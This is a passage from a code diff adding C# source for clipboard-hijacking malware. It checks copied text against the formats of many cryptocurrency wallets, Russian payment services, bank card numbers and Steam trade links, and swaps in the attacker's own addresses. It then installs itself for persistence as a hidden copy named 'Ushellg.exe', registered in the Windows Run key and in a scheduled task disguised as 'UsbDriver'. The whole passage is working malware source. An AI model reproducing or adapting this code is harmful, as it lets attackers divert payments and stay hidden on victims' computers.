+                #endregion
+
+                #region Lisk Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Lsk) && BufferText.Length >= 21 && (BufferText.Length <= 22) && EndsWithAny(BufferText, "L"))
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Lsk);
+                }
+
+                #endregion
+
+                #region Waves Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Waves) && CheckisUpper(BufferText, 1) && StartsWith(BufferText, "3P") && BufferText.Length >= 35 && BufferText.Length <= 36)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Waves);
+                }
+
+                #endregion
+
+                #region Qutum Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Qtum) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "Q") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Qtum);
+                }
+
+                #endregion
+
+                #region Xlm Stellar Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Stellar) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "G") && BufferText.Length >= 56 && BufferText.Length <= 57)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Stellar);
+                }
+
+                #endregion
+
+                #region Binance Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Bnb) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "bnb") && BufferText.Length >= 42 && BufferText.Length <= 43)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Bnb);
+                }
+
+                #endregion
+
+                #region Tron Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Tron) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "T") && BufferText.Length >= 33 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Tron);
+                }
+
+                #endregion
+
+                #region EOS AccountName Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Eos) && !CheckisUpper(BufferText, 0) && BufferText.Length == 12)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Eos);
+                }
+
+                #endregion
+
+                #region Bytecoin Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Bcn) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "bcn") && BufferText.Length >= 98 && BufferText.Length <= 99)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Bcn);
+                }
+
+                #endregion
+
+                #region Via Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Via) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "V") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Via);
+                }
+
+                #endregion
+
+                #region BlockNet Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.BlockNet) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "B") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.BlockNet);
+                }
+
+                #endregion
+
+                #region BlackJack Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.BlackJack) && StartsWith(BufferText, "9") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.BlackJack);
+                }
+
+                #endregion
+
+                #region Yandex Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.YandexMoney) && StartsWith(BufferText, "P") != StartsWith(BufferText, "41") && BufferText.Length >= 15 && BufferText.Length <= 16)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.YandexMoney);
+                }
+
+                #endregion
+
+                #region Qiwi Purse Changer
+
+                foreach (string v in new[] { "7", "+7", "79", "+8", "89", "375", "+375", "+380" })
+                {
+                    if (!string.IsNullOrWhiteSpace(Wallets.Qiwi) && StartsWith(BufferText, v) && BufferText.Length >= 11 && BufferText.Length <= 16)
+                    {
+                        ClipboardEx.SetClipboardText(Wallets.Qiwi);
+                    }
+                }
+
+                #endregion
+
+                #region DonAlert Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.DonAlerts) && StartsWith(BufferText, "https://www.donationalerts.com/r/"))
+                {
+                    ClipboardEx.SetClipboardText(Wallets.DonAlerts);
+                }
+
+                #endregion
+
+                #region DonPay Purse Changer
+
+                if ((!string.IsNullOrWhiteSpace(Wallets.DonPay) && StartsWith(BufferText, "https://donatepay.ru/don/")) || StartsWith(BufferText, "https://donatepay.ru/donation/"))
+                {
+                    ClipboardEx.SetClipboardText(Wallets.DonPay);
+                }
+
+                #endregion
+
+                #region SberBank Purse Changer
+
+                try
+                {
+                    Regex RgxS = new Regex(@"\s");
+                    if ((!string.IsNullOrWhiteSpace(Wallets.SberBank) && !StartsWith(BufferText, "41") && RgxS.IsMatch(BufferText) && BufferText.Length >= 19 && BufferText.Length <= 20) || (!string.IsNullOrWhiteSpace(Wallets.SberBank) && !StartsWith(BufferText, "41") && (BufferText.Length >= 16) && BufferText.Length <= 17))
+                    {
+                        ClipboardEx.SetClipboardText(Wallets.SberBank);
+                    }
+                }
+                catch (Exception) { }
+
+                #endregion
+
+                #region SteamTradeOffer Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Steam) && BufferText.Contains("steamcommunity.com/tradeoffer/new/?partner="))
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Steam);
+                }
+
+                #endregion
+
+                #region Bitcoin Diamond Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.BitcoinDiamond) && StartsWith(BufferText, "1J") && (BufferText.Length >= 34) && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.BitcoinDiamond);
+                }
+
+                #endregion
+
+                #region Decred Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Decred) && StartsWith(BufferText, "Ds") && (BufferText.Length >= 35) && BufferText.Length <= 36)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Decred);
+                }
+
+                #endregion
+
+                #region Tezos Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Tezos) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "tz1") && (BufferText.Length >= 36) && BufferText.Length <= 37)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Tezos);
+                }
+
+                #endregion
+
+                #region Cosmos Purse Changer
+
+                if ((!string.IsNullOrWhiteSpace(Wallets.Cosmos) && StartsWith(BufferText, "cosmos") && (BufferText.Length >= 45) && BufferText.Length <= 46) || (!string.IsNullOrWhiteSpace(Wallets.Cosmos) && StartsWith(BufferText, "cosmos") && (BufferText.Length >= 52) && BufferText.Length <= 53))
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Cosmos);
+                }
+
+                #endregion
+
+                #region SmartCash Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.SmartCash)
+                    && CheckisUpper(BufferText, 0)
+                    && StartsWith(BufferText, "S")
+                    && (BufferText.Length >= 34)
+                    && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.SmartCash);
+                }
+
+                #endregion
+
+                #region WebMoney Purse Changer
+
+                if (!Regex.IsMatch(BufferText, @"\w{1}\d{12}")) return;
+
+                switch (BufferText[0])
+                {
+                    case 'R':
+                        if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMR))
+                        {
+                            ClipboardEx.SetClipboardText(Wallets.WebMoney_WMR);
+                        }
+                        break;
+
+                    case 'Z':
+                        if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMZ))
+                        {
+                            ClipboardEx.SetClipboardText(Wallets.WebMoney_WMZ);
+                        }
+                        break;
+
+                    case 'U':
+                        if (!string.IsNullOrWhiteSpace(Wallets.WebMoney_WMU))
+                        {
+                            ClipboardEx.SetClipboardText(Wallets.WebMoney_WMU);
+                        }
+                        break;
+                }
+
+                #endregion
+            }
+            catch (Exception) { }
+        }
+    }
+    public static class GlobalDirectory
+    {
+        public static bool CreateDirectory(string path)
+        {
+            try
+            {
+                DirectoryInfo dir = new DirectoryInfo(path);
+                dir.Create(); dir.Refresh(); dir.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                return true;
+            }
+            catch (Exception) { return false; }
+        }
+    }
+    public static class GlobalFile
+    {
+        public static bool IsHideOrNo()
+        {
+            try
+            {
+                if (File.GetAttributes(GlobalPath.AssemblyPath).HasFlag(FileAttributes.Hidden))
+                {
+                    return true;
+                }
+                return false;
+            }
+            catch { return false; }
+        }
+        public static void HideFile(string path, FileAttributes attributes)
+        { 
+            try 
+            { 
+                File.SetAttributes(path, attributes); 
+            } 
+            catch (Exception) { } 
+        }
+    }
+    public static class InjReg
+    {
+        public static void CopyAndShelduderInizialize()
+        {
+            const string REGPATH = @"Software\Microsoft\Windows\CurrentVersion\Run";
+            ProcessControl.KillClipInizialize();
+            string PathS = GlobalPath.StartUpFromAppDataReserv,
+            App = Path.Combine(PathS, Path.GetFileName(GlobalPath.AssemblyPath.Replace(GlobalPath.AssemblyPath, "Ushellg.exe")));
+            RunSystem.Scheduler(false, "minute", 1, "highest", "UsbDriver", string.Concat("\"", App, "\""));
+            RegistryControl.RegStartupInizialize(false, REGPATH, "UsbDriver", App);
+            Directory.Delete(GlobalPath.StartUpFromAppDataReserv);
+
+            Thread.Sleep(2000);
+            if (!Directory.Exists(PathS))
+            {
+                if (GlobalDirectory.CreateDirectory(PathS))
+                {
+                    File.Copy(GlobalPath.AssemblyPath, App, false);
+                    Thread.Sleep(2000);
+
+                    if (File.Exists(App))
+                    {
+                        if (RunCheck.IsUserAdministrator())
+                        {
+                            RunSystem.Scheduler(true, "minute", 1, "highest", "UsbDriver", string.Concat("\"", App, "\""));
+                            RegistryControl.RegStartupInizialize(true, REGPATH, "UsbNDriver", App);
+                            if (!GlobalFile.IsHideOrNo())
+                            {
+                                GlobalFile.HideFile(App, FileAttributes.Hidden);
+                            }
+                        }
+                        else
+                        {
+                            RegistryControl.RegStartupInizialize(true, REGPATH, "UsbNDriver", App);
+                            if (!GlobalFile.IsHideOrNo())
+                            {
+                                GlobalFile.HideFile(App, FileAttributes.Hidden);
+                            }
+                            ProcessControl.RunFile(App);
+                        }
+                    }
+                }
+            }
+            else
+            {
+                return;
+            }
+        }
+    }
+}
